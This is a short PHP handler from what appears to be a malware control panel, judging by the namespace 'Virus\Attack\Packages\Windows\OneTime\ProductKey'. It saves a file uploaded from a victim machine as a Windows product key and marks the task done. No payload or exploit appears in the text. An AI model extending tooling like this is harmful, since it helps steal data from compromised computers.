<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\ProductKey\ProductKey $this */

$this->setProductKey($this->requestData->fileCheck("file"))->setExecuted();
